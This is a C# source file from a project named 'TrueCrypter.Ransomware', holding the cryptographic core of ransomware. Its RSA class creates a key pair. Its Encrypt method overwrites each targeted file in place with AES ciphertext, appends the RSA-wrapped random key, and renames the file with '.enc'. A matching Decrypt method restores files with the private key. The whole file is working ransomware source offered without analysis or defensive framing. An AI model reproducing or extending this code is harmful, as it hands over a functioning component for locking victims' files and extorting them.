using System;
using System.IO;
using System.Security.Cryptography;

namespace TrueCrypter.Ransomware.Core.Cryptography;

public class RSA
{
	private AES AES = new AES();

	private RSACryptoServiceProvider RSACryptoServiceProvider = new RSACryptoServiceProvider(2048);

	private RNGCryptoServiceProvider RNGCryptoServiceProvider = new RNGCryptoServiceProvider();

	private BinaryWriter bWriter;

	public string PublicKey;

	public string PrivateKey;

	private byte[] Salt;

	private byte[] FileBytes;

	private byte[] FileBytesAES;

	private byte[] EncryptedPassword;

	private byte[] DecryptedPassword;

	public RSA()
	{
		RSACryptoServiceProvider.PersistKeyInCsp = false;
		PublicKey = Convert.ToBase64String(RSACryptoServiceProvider.ExportCspBlob(includePrivateParameters: false));
		PrivateKey = Convert.ToBase64String(RSACryptoServiceProvider.ExportCspBlob(includePrivateParameters: true));
	}

	private byte[] CreateSalt(ushort Size)
	{
		byte[] array = new byte[Size];
		RNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public bool Encrypt(string Path)
	{
		try
		{
			Salt = CreateSalt(245);
			FileBytes = File.ReadAllBytes(Path);
			bWriter = new BinaryWriter(File.Open(Path, FileMode.Truncate, FileAccess.ReadWrite));
			bWriter.Write(AES.EncryptBytes(FileBytes, Salt));
			bWriter.Write(RSACryptoServiceProvider.Encrypt(Salt, fOAEP: false));
			bWriter.Close();
			File.Move(Path, Path + ".enc");
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool Decrypt(string Path)
	{
		try
		{
			RSACryptoServiceProvider.ImportCspBlob(Convert.FromBase64String(PrivateKey));
			FileBytesAES = File.ReadAllBytes(Path);
			EncryptedPassword = new byte[256];
			Buffer.BlockCopy(FileBytesAES, FileBytesAES.Length - 256, EncryptedPassword, 0, 256);
			DecryptedPassword = RSACryptoServiceProvider.Decrypt(EncryptedPassword, fOAEP: false);
			FileBytes = new byte[FileBytesAES.Length - 256];
			Buffer.BlockCopy(FileBytesAES, 0, FileBytes, 0, FileBytesAES.Length - 256);
			File.WriteAllBytes(Path, AES.DecryptBytes(FileBytes, DecryptedPassword));
			File.Move(Path, Path.Replace(".enc", ""));
			return true;
		}
		catch
		{
			return false;
		}
	}
}
